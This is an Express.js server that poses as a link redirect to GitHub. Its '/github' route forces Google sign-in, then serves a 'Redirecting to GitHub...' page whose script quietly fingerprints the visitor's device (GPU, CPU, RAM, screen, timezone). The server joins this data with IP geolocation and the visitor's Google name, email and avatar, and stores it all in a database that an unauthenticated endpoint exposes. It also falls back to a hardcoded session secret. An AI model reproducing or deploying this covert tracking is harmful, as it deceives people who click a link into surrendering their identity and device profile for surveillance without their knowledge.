require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const useragent = require('express-useragent');
const requestIp = require('request-ip');
const session = require('express-session');
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

const Click = require('./models/Click');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(useragent.express());
app.use(requestIp.mw());

// Session setup for Passport
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-key-12345',
  resave: false,
  saveUninitialized: true
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => {
  done(null, user);
});
passport.deserializeUser((obj, done) => {
  done(null, obj);
});

// Configure Google OAuth Strategy
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID || 'dummy-client-id',
    clientSecret: process.env.GOOGLE_CLIENT_SECRET || 'dummy-client-secret',
    callbackURL: "/auth/google/callback",
    proxy: true // IMPORTANT: Required for Render/Vercel to handle https callbacks correctly
  },
  function(accessToken, refreshToken, profile, done) {
    return done(null, profile);
  }
));

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// Google Auth Routes
app.get('/github', (req, res) => {
  res.redirect('/auth/google');
});

app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/github' }),
  function(req, res) {
    // Successful authentication, redirect to tracking logic.
    res.redirect('/track-page');
  });

// Redirect & Log Route (Serves Client Script)
app.get('/track-page', (req, res) => {
  if (!req.user) {
    return res.redirect('/auth/google');
  }
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0d1117; color: #c9d1d9; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #58a6ff; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { display: flex; flex-direction: column; align-items: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div>Redirecting to GitHub...</div>
    </div>
    <script>
        async function gatherAndRedirect() {
            try {
                const getGPU = () => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                        }
                    } catch (e) {}
                    return 'Unknown';
                };

                const payload = {
                    cpuCores: navigator.hardwareConcurrency || null,
                    ram: navigator.deviceMemory || null,
                    gpu: getGPU(),
                    screenResolution: \`\${window.screen.width}x\${window.screen.height}\`,
                    colorDepth: window.screen.colorDepth || null,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                    language: navigator.language || 'Unknown',
                    referrer: document.referrer || 'Direct'
                };

                const response = await fetch('/api/track-client', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                if (data.url) {
                    window.location.href = data.url;
                } else {
                    window.location.href = 'https://github.com';
                }
            } catch (error) {
                console.error(error);
                window.location.href = 'https://github.com';
            }
        }
        
        // Run immediately
        gatherAndRedirect();
    </script>
</body>
</html>
  `;
  res.send(html);
});

// Endpoint to receive client-side data
app.post('/api/track-client', async (req, res) => {
  try {
    const clientData = req.body;
    let country = 'Unknown';
    let city = 'Unknown';
    let isp = 'Unknown';

    const ipAddress = req.clientIp;

    // Fetch geolocation
    try {
      if (ipAddress && ipAddress !== '::1' && ipAddress !== '127.0.0.1') {
        const cleanIp = ipAddress.replace(/^.*:/, '');
        const geoRes = await fetch(`http://ip-api.com/json/${cleanIp}`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
          country = geoData.country;
          city = geoData.city;
          isp = geoData.isp;
        }
      }
    } catch (e) {
      console.log('Geo fetch error:', e.message);
    }

    const googleName = req.user ? req.user.displayName : 'Unknown';
    const googleEmail = (req.user && req.user.emails && req.user.emails[0]) ? req.user.emails[0].value : 'Unknown';
    const googleAvatar = (req.user && req.user.photos && req.user.photos[0]) ? req.user.photos[0].value : '';

    const newClick = new Click({
      ipAddress: ipAddress,
      userAgent: req.headers['user-agent'],
      browser: req.useragent.browser,
      browserVersion: req.useragent.version,
      os: req.useragent.os,
      osVersion: req.useragent.osVersion || 'Unknown',
      device: req.useragent.isMobile ? 'Mobile' : req.useragent.isTablet ? 'Tablet' : 'Desktop',
      referrer: clientData.referrer !== 'Direct' && clientData.referrer ? clientData.referrer : (req.headers.referer || 'Direct'),
      country,
      city,
      isp,
      cpuCores: clientData.cpuCores,
      ram: clientData.ram,
      gpu: clientData.gpu,
      screenResolution: clientData.screenResolution,
      colorDepth: clientData.colorDepth,
      timezone: clientData.timezone,
      language: clientData.language,
      latitude: clientData.latitude,
      longitude: clientData.longitude,
      googleName,
      googleEmail,
      googleAvatar
    });

    await newClick.save();

    res.json({ url: process.env.GITHUB_URL || 'https://github.com' });
  } catch (error) {
    console.error('Error logging click:', error);
    res.json({ url: process.env.GITHUB_URL || 'https://github.com' });
  }
});

// Analytics Route (for the dashboard)
app.get('/api/clicks', async (req, res) => {
  try {
    const clicks = await Click.find().sort({ timestamp: -1 });
    res.json(clicks);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch clicks' });
  }
});

// Aggregate data for dashboard charts
app.get('/api/analytics', async (req, res) => {
  try {
    const totalClicks = await Click.countDocuments();

    const browserStats = await Click.aggregate([
      { $group: { _id: "$browser", count: { $sum: 1 } } }
    ]);

    const deviceStats = await Click.aggregate([
      { $group: { _id: "$device", count: { $sum: 1 } } }
    ]);

    const osStats = await Click.aggregate([
      { $group: { _id: "$os", count: { $sum: 1 } } }
    ]);

    res.json({
      totalClicks,
      browserStats,
      deviceStats,
      osStats
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch analytics' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
